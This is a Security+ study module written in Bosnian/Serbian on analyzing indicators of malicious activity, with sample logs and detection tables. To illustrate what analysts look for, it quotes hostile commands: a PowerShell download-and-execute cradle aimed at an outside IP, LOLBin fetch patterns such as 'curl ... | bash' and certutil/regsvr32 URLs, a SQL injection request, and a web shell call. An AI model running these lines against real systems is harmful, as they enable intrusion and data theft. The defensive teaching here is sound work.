## Cilj ispita: 1.2

- **1.2** Given a scenario, analyze indicators of potential malicious activity: mrežni indikatori (rogue devices, enumeration, anomalije, saobraćaj na neočekivanim portovima), indikatori na hostu (potrošnja resursa, neodobren softver, sumnjivi procesi, LOLBins, izmjene fajl sistema, eksfiltracija, neodobrena konfiguracija), aplikacijski, cloud i identitetski indikatori, socijalni inženjering (typosquatting, URL shorteners) i napadi preko e-pošte (BEC).

Nakon ovog modula trebalo bi da znaš:

- iz isječka loga, pcap-a ili opisa simptoma prepoznati o kojoj vrsti aktivnosti se radi;
- razlikovati benigni šum od indikatora koji traži eskalaciju;
- prepoznati LOLBins zloupotrebu i tipične Windows i Linux artefakte;
- čitati cloud i identitetske indikatore (impossible travel, kompromitovan IAM ključ, cryptomining);
- prepoznati BEC, typosquatting i skraćene URL-ove u phishing scenariju.

Ovo je scenarijski cilj: na ispitu dobiješ log, pcap izlaz ili opis ponašanja i biraš šta se MOST likely dešava ili šta je sljedeći korak. Vještina je ista kao u detection labu kada si pisao Sigma pravila: prvo znaš šta je normalno, pa tražiš odstupanje.

## Kako razmišljati o indikatorima

| Pojam | Značenje | Primjer |
|---|---|---|
| **IoC** (indicator of compromise) | Artefakt koji ukazuje da je kompromitacija već nastupila | Hash malvera, IP C2 servera |
| **IoA** (indicator of attack) | Ponašanje koje ukazuje na napad u toku | Proces Worda pokreće PowerShell |
| **Baseline** | Izmjereno normalno stanje | Server šalje prosječno 200 MB dnevno |
| **Anomalija** | Odstupanje od baseline-a | Isti server šalje 40 GB u 3 h noću |

Svaka anomalija nije napad: backup, patch dan ili novi release mijenjaju sliku. Zato se anomalija uvijek provjerava kontekstom (change management, vlasnik sistema, vrijeme).

## Mrežni indikatori

### Rogue devices

**Rogue device** je neodobren uređaj u mreži: Raspberry Pi iza printera, lični ruter, **rogue access point** ili **evil twin** (AP sa istim SSID-om kao korporativni). Indikatori:

- nova MAC adresa sa nepoznatim OUI proizvođačem u DHCP ili switch logovima;
- dva DHCP servera u istom segmentu (rogue DHCP daje lažni gateway/DNS);
- isti SSID oglašen sa nepoznatog BSSID-a;
- uređaj bez EDR agenta i bez zapisa u CMDB-u.

```text
Oct 16 09:02:11 dhcp01 dhcpd: DHCPACK on 10.0.5.77 to b8:27:eb:4a:91:0c (raspberrypi) via eth1
```

`b8:27:eb` je OUI Raspberry Pi fondacije: u kancelarijskoj mreži bez odobrenog IoT projekta to je vrijedno provjere. Odbrana: **802.1X/NAC**, port security, poređenje sa inventarom.

### Enumeration (izviđanje)

**Enumeration** je prikupljanje informacija o mreži, servisima i nalozima: ping sweep, port scan, DNS zone transfer, LDAP upiti za sve korisnike, SMB enumeracija share-ova. Indikator je obrazac **jedan izvor → mnogo odredišta ili portova u kratkom vremenu**:

```bash
$ tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" \
    -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn | head
      1 10.0.5.77   21
      1 10.0.5.77   22
      1 10.0.5.77   23
      1 10.0.5.77   25
...
$ tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0 && ip.src==10.0.5.77" | wc -l
1000
```

Jedna adresa koja šalje SYN na 1000 različitih portova bez završenog handshake-a je **SYN (half-open) scan**. Horizontalni sweep (isti port, mnogo hostova, npr. 445 na cijeli /24) ukazuje na traženje sljedeće mete ili crva.

| Obrazac | Šta je |
|---|---|
| Jedan host, mnogo portova | Vertikalni port scan |
| Mnogo hostova, jedan port | Horizontalni sweep (traženje servisa, širenje crva) |
| ICMP echo na cijeli subnet | Ping sweep (host discovery) |
| `AXFR` upit sa radne stanice | Pokušaj DNS zone transfera |
| Hiljade LDAP upita `(objectClass=user)` | AD enumeracija (BloodHound-tip alata) |

### Anomalous activity

- **Beaconing**: pravilne konekcije ka istom odredištu u fiksnim intervalima (npr. svakih 60 s ± jitter), male i ujednačene veličine. Tipično za C2.
- **Traffic spikes**: nagli skok volumena, posebno odlaznog (eksfiltracija) ili dolaznog (DDoS).
- **Irregular peer-to-peer**: radne stanice komuniciraju direktno međusobno preko SMB/RDP/WinRM, što ukazuje na lateral movement.
- **DNS anomalije**: veoma dugi poddomeni sa nasumičnim znakovima (**DNS tunneling**), mnogo NXDOMAIN odgovora (**DGA** malver traži aktivan domen), TXT upiti velikog volumena.

```bash
$ tshark -r capture.pcap -Y "ip.dst==198.51.100.23" -T fields -e frame.time_relative -e frame.len
12.004   154
72.011   154
132.009  154
192.015  154
```

Razmak od ~60 s i identična veličina paketa: klasičan **beacon**.

```bash
$ tshark -r capture.pcap -Y dns.qry.name -T fields -e dns.qry.name | awk '{print length, $0}' | sort -rn | head -2
63 aGVsbG8gd29ybGQgdGhpcyBpcyBleGZpbHRyYXRpb24.t.example-cdn.net
61 c2VjcmV0IGRhdGEgZnJvbSBzZXJ2ZXIgMTAgMSA1IDc.t.example-cdn.net
```

Base64 nalik poddomeni maksimalne dužine labele (63 znaka) ka istom domenu znače **DNS tunneling**/eksfiltraciju.

### Activity on unexpected ports

Servis na nestandardnom portu (SSH na 2222, HTTP na 8443 sa radne stanice) ili poznat protokol na pogrešnom portu (TLS na 53, IRC na 6667) sam po sebi nije dokaz, ali odstupa od baseline-a. Pitaj: da li host treba slušati na tom portu, i da li protokol odgovara portu?

```bash
$ ss -tlnp
State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
LISTEN 0      128    0.0.0.0:22         0.0.0.0:*     users:(("sshd",pid=612))
LISTEN 0      5      0.0.0.0:4444       0.0.0.0:*     users:(("nc",pid=8812))   ← netcat listener
```

> **Na ispitu:** Pravilni intervali + ista veličina = **beaconing (C2)**. Dugi nasumični poddomeni = **DNS tunneling**. Mnogo NXDOMAIN = **DGA**. Mnogo portova sa jednog izvora = **scan/enumeracija**. Radna stanica → radna stanica preko SMB/RDP = **lateral movement**.

## Indikatori na hostu

### Resource consumption

Neobjašnjiva potrošnja CPU-a, memorije, diska ili mreže:

- CPU stalno na 100% sa procesom sumnjivog imena → **cryptominer**;
- disk se puni velikom brzinom i fajlovi dobijaju novu ekstenziju → **ransomware** u toku;
- nestanak slobodne memorije → memory leak ili maliciozan proces;
- disk prepun arhiva (`.7z`, `.rar`) u `C:\PerfLogs` ili `/tmp` → **staging** prije eksfiltracije.

```bash
$ top -b -n1 | head -12
  PID USER     %CPU %MEM COMMAND
 9921 www-data 398.0  2.1 kswapd0          ← „kernel“ proces koji radi kao www-data
```

Pravi `kswapd0` je kernel thread (vlasnik root, u `ps` prikazan kao `[kswapd0]`). Isto ime pod korisnikom `www-data` je maskiran miner.

### Unauthorized software i unauthorized configuration

- **Unauthorized software**: alati za udaljeni pristup (AnyDesk, ngrok) koje IT nije odobrio, alati za dump kredencijala, skeneri, portable aplikacije u korisničkom profilu. Detekcija: inventar softvera, **application allow-listing** (AppLocker, WDAC), EDR.
- **Unauthorized configuration**: isključen Defender (`Set-MpPreference -DisableRealtimeMonitoring $true`), dodati izuzeci u antivirus, firewall pravilo koje otvara RDP, izmijenjen `hosts` fajl, novi lokalni admin, izmijenjena audit politika. Ovo se poredi sa **baseline konfiguracijom** (GPO, CIS, IaC drift).

```text
EventID 5001  Microsoft-Windows-Windows Defender/Operational
Real-time Protection is disabled.
EventID 4720  A user account was created.  Account Name: helpdesk$
EventID 4732  A member was added to a security-enabled local group.  Group: Administrators
```

### Suspicious or rogue processes

Signali (vidi i normalno stablo procesa u modulu 1):

- pogrešan roditelj (Office → `cmd.exe`/`powershell.exe`, `w3wp.exe` → `cmd.exe` = web shell);
- sistemsko ime na pogrešnoj putanji ili sa slovnom greškom (`scvhost.exe`, `lsasss.exe`);
- proces bez potpisa, bez fajla na disku ili sa obrisanim binarnim fajlom;
- proces koji otvara mrežnu konekciju a ne bi trebao (npr. `notepad.exe` ka internetu).

### LOLBins i skripte

**Living Off the Land Binaries (LOLBins)** su legitimni, potpisani alati OS-a koje napadač koristi da izbjegne detekciju (katalog: LOLBAS projekat za Windows, GTFOBins za Linux). Indikator nije sam alat, nego **neuobičajena upotreba**.

| Alat | Normalna upotreba | Sumnjiv obrazac |
|---|---|---|
| `powershell.exe` | Administracija | `-enc` (Base64), `-w hidden`, `IEX (New-Object Net.WebClient).DownloadString(...)` |
| `certutil.exe` | Rad sa certifikatima | `-urlcache -f http://...` (preuzimanje fajla), `-decode` |
| `mshta.exe` | HTML aplikacije | Pokreće `.hta` sa URL-a |
| `rundll32.exe` | Učitavanje DLL-a | DLL iz `%TEMP%` ili javascript: argument |
| `regsvr32.exe` | Registracija COM | `/i:http://... scrobj.dll` |
| `bitsadmin.exe` | Prenos fajlova | Preuzimanje sa nepoznatog domena |
| `wmic.exe` | Upravljanje | `process call create` na udaljenom hostu |
| `curl`/`wget` + `bash` (Linux) | Preuzimanje | `curl http://x/s.sh \| bash` iz web servisa |

```text
EventID 4104 (PowerShell Script Block Logging)
ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
```

> **Na ispitu:** Legitiman, potpisan Windows alat koji preuzima ili dekodira sadržaj sa interneta (certutil, mshta, regsvr32, bitsadmin) je **LOLBin** tehnika. Signature-based antivirus je tu slab; pomažu **EDR, Script Block Logging i allow-listing**.

### File system changes

- novi fajlovi u `%TEMP%`, `%APPDATA%`, `C:\ProgramData`, `/tmp`, `/dev/shm`;
- masovna promjena ekstenzija i pojava `README_DECRYPT.txt` → ransomware;
- izmijenjeni sistemski binarni fajlovi (provjera hashom, FIM: Wazuh syscheck kao u detection labu);
- **timestomping**: vrijeme izmjene fajla namjerno postavljeno u prošlost (neslaganje `$STANDARD_INFORMATION` i `$FILE_NAME` u NTFS-u);
- **Alternate Data Streams** (`file.txt:hidden.exe`) na NTFS-u.

### Data exfiltration

Indikatori: veliki odlazni prenos ka neobičnoj destinaciji (lični cloud storage, novi domen), prenos van radnog vremena, arhive sa lozinkom, upotreba `rclone`, `scp`, DNS/ICMP tunela, upload preko HTTPS ka file-sharing servisu. Pogledaj omjer poslato/primljeno: običan korisnik mnogo više prima nego što šalje.

## Aplikacijski indikatori

- **Service disruption**: aplikacija prestane da odgovara, restartuje se, vraća 500 greške. Uzroci mogu biti DoS, exploit koji ruši proces, ransomware ili zlonamjerna izmjena konfiguracije.
- **Anomalous activity**: nove admin naloge u aplikaciji, neočekivan izlaz (greške baze u HTTP odgovoru), odlazne konekcije sa aplikacijskog servera, neuobičajeni zahtjevi u logu.

```text
203.0.113.45 - - [16/Oct/2026:09:14:22 +0000] "GET /products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 1243
203.0.113.45 - - [16/Oct/2026:09:14:25 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12
```

Prvi red je pokušaj **SQL injection**, drugi je **web shell** u folderu za upload. Sljedeći korak: provjeriti stablo procesa web servera i odlazne konekcije.

## Cloud indikatori

- **Anomalous activity**: API pozivi iz nove zemlje ili ASN-a, `ListBuckets`/`GetSecretValue` serija sa jednog ključa (izviđanje), `StopLogging`/`DeleteTrail`, gašenje GuardDuty-ja, kreiranje novog IAM korisnika ili access ključa, javno dijeljenje snapshot-a ili bucketa.
- **Resource compromise**: kompromitovana instanca ili nalog koji pokreće **cryptomining** (nagli rast troška, GPU instance u regionima koje ne koristiš), kontejner koji se spaja na mining pool, Lambda koja šalje spam.

```json
{
  "eventName": "RunInstances",
  "awsRegion": "ap-southeast-3",
  "userIdentity": {"type": "IAMUser", "userName": "ci-deploy", "accessKeyId": "AKIA...7QX"},
  "sourceIPAddress": "185.220.101.4",
  "requestParameters": {"instanceType": "p4d.24xlarge", "minCount": 20}
}
```

Servisni CI nalog koji iz Tor izlaznog čvora pokreće 20 GPU instanci u neiskorištenom regionu: kompromitovan ključ i resource compromise radi rudarenja.

## Identitetski indikatori

- **IAM account compromise**: prijava sa nove lokacije i novog uređaja, nakon čega slijedi registracija nove MFA metode, kreiranje inbox pravila, promjena lozinke ili dodavanje access ključa. Serija neuspjelih prijava na mnogo naloga sa jednom lozinkom = **password spraying**; mnogo pokušaja na jedan nalog = **brute force**; mnogo uzastopnih MFA push zahtjeva = **MFA fatigue**.
- **Unauthorized access**: pristup resursu van uloge (računovođa čita repozitorij koda), upotreba naloga bivšeg zaposlenog, servisni nalog koji se prijavljuje interaktivno, privilege escalation (Event 4672 za nalog koji nije admin).
- **Impossible travel**: dvije uspješne prijave sa lokacija koje su preudaljene za proteklo vrijeme (Beograd u 09:00, São Paulo u 09:40). Prije eskalacije isključi VPN, cloud proxy i mobilne mreže sa pogrešnom geolokacijom.

```text
TimeGenerated         UserPrincipalName      IPAddress        Location   ResultType
2026-10-16 09:01:12   m.petrovic@corp.ba     91.185.x.x       BA         0
2026-10-16 09:38:47   m.petrovic@corp.ba     177.54.x.x       BR         0
2026-10-16 09:39:30   m.petrovic@corp.ba     177.54.x.x       BR         0  (Add MFA method)
```

| Windows Event ID | Značenje | Indikator kada |
|---|---|---|
| 4624 / 4625 | Uspješna / neuspjela prijava | Mnogo 4625 pa 4624 (brute force uspio); Logon Type 10 (RDP) sa neočekivanog izvora |
| 4648 | Prijava sa eksplicitnim kredencijalima | Lateral movement (runas, PsExec) |
| 4672 | Dodijeljene specijalne privilegije | Nalog koji ne bi trebao biti admin |
| 4720 / 4732 | Kreiran nalog / dodat u grupu | Novi admin van change procesa |
| 4769 | Kerberos service ticket | Mnogo zahtjeva sa RC4 enkripcijom = **Kerberoasting** |
| 1102 | Security log očišćen | Prikrivanje tragova |

> **Na ispitu:** **Impossible travel** je indikator, ne presuda: prvo provjeri VPN i proxy. Prijava praćena **registracijom nove MFA metode** ili **inbox pravilom** je jak znak preuzetog naloga i traži reset sesija i kredencijala.

## Socijalni inženjering i e-pošta

### Typosquatting i URL shorteners

- **Typosquatting**: domen sa slovnom greškom ili sličnim znakovima: `micros0ft.com`, `rnicrosoft.com` (rn umjesto m), `paypa1.com`, homoglifi iz drugih pisama (ćirilično „а“ u `аpple.com`, prikazano kao `xn--pple-43d.com` u punycode-u), drugi TLD (`corp.co` umjesto `corp.com`).
- **URL shorteners** (bit.ly i slični) sakrivaju krajnju destinaciju. Analitičar razvija link bez klika (servis za preview, `curl -sI` u sandboxu i čitanje `Location` zaglavlja) i provjerava reputaciju krajnjeg domena.

```bash
$ curl -sI https://bit.ly/3xYzAbc | grep -i location
location: https://login.micros0ft-support.com/owa/?session=...
```

### Business email compromise (BEC)

**BEC** je prevara bez malvera: napadač se predstavlja kao direktor, dobavljač ili advokat i traži uplatu ili promjenu bankovnog računa. Varijante: lažni CEO (CEO fraud), kompromitovano sanduče pravog dobavljača (**vendor email compromise**), lažna faktura. Indikatori:

- hitnost, tajnost, zaobilaženje uobičajene procedure („ne zovi, u sastanku sam“);
- `Reply-To` se razlikuje od `From`; domen sličan pravom (typosquatting);
- SPF/DKIM/DMARC `fail` ili domen registrovan prije nekoliko dana;
- u kompromitovanom sanduču: **inbox pravilo** koje premješta ili briše poruke sa riječima „faktura“, „uplata“.

```text
From: "Ana Kovač, CEO" <ana.kovac@corp-ba.com>
Reply-To: ana.kovac.ceo@gmail.com
Authentication-Results: spf=fail smtp.mailfrom=corp-ba.com; dkim=none; dmarc=fail action=quarantine
Subject: Hitno - uplata dobavljaču danas
```

> **Na ispitu:** BEC se ne zaustavlja antivirusom jer nema priloga ni linka. Najbolje kontrole su **procedura verifikacije van kanala** (poziv na poznat broj prije promjene računa), **DMARC sa p=reject**, označavanje eksternih poruka i obuka finansija.

## Spajanje indikatora: primjer lanca

Pojedinačan indikator je slab, a lanac je jak. Evo kako izgleda kompromitacija Linux web servera kroz logove, od prvog do posljednjeg traga:

```text
09:14:22  nginx access   POST /upload.php  200          ← upload fajla
09:14:25  nginx access   GET /uploads/x.php?c=id  200   ← web shell (aplikacijski indikator)
09:14:31  auditd         execve uid=33 exe=/usr/bin/curl a1="http://198.51.100.23/m"  ← preuzimanje
09:14:33  auditd         execve uid=33 exe=/tmp/.m/kswapd0                ← proces iz /tmp, lažno ime
09:15:00  netflow        10.0.1.20 → 198.51.100.23:3333  svakih 60 s      ← beaconing / mining pool
09:20:00  node_exporter  CPU 100% na sva 4 jezgra                         ← resource consumption
```

Isti događaj pogođen iz različitih uglova daje **više izvora iste priče**, što podiže povjerenje u zaključak i olakšava eskalaciju.

## Benigno ili zlonamjerno: brza trijaža

| Opažanje | Benigno objašnjenje koje treba isključiti | Kako provjeriti |
|---|---|---|
| Impossible travel | Korporativni VPN, cloud proxy, mobilna mreža | ASN i tip IP adrese, ostali korisnici sa iste IP |
| Port scan sa internog hosta | Odobren skener ranjivosti | Lista odobrenih skenera, raspored skeniranja |
| Veliki odlazni prenos noću | Backup ili replikacija | Odredište, change management, vlasnik servisa |
| `certutil -urlcache` | Rijetko legitimno (preuzimanje CRL-a) | Odredišni URL, roditeljski proces, korisnik |
| CPU 100% | Build, indeksiranje, patch | Ime i putanja procesa, potpis, mrežne konekcije |
| Novi lokalni admin | Helpdesk zahtjev | Ticket, ko je kreirao nalog, vrijeme |
| Prijava sa nove zemlje | Službeni put | Kalendar/HR, uređaj, MFA metoda |

> **Na ispitu:** Pitanje sa „What should the analyst do FIRST?“ nakon jednog indikatora obično očekuje **validaciju i prikupljanje konteksta** (provjera baseline-a, vlasnika, change ticketa), a ne odmah gašenje sistema, osim ako scenarij jasno pokazuje aktivnu štetu (npr. enkripcija fajlova u toku).

## Rezime

- Indikator se čita naspram **baseline-a**; anomalija traži kontekst prije eskalacije.
- Mreža: **rogue device** (nova MAC, rogue DHCP/AP), **enumeration** (jedan izvor, mnogo portova/hostova), **beaconing** (pravilni intervali), **DNS tunneling/DGA**, neočekivani portovi i peer-to-peer saobraćaj.
- Host: neobjašnjiva **potrošnja resursa** (miner, ransomware), **neodobren softver i konfiguracija** (isključen Defender, novi admin), procesi sa pogrešnim roditeljem ili putanjom, **LOLBins** (certutil, mshta, PowerShell `-enc`), izmjene fajl sistema i **eksfiltracija**.
- Aplikacija: prekid servisa, SQLi i web shell u access logu, neočekivane odlazne konekcije.
- Cloud: API pozivi iz neobičnih lokacija, gašenje logovanja, **resource compromise** radi rudarenja.
- Identitet: **impossible travel**, spraying vs brute force, MFA fatigue, nova MFA metoda i inbox pravila nakon prijave, ključni Event ID-ovi (4624/4625/4672/4720/4769/1102).
- **Typosquatting** i **URL shorteners** sakrivaju pravu destinaciju; **BEC** je prevara bez malvera koju zaustavljaju procedure i DMARC.
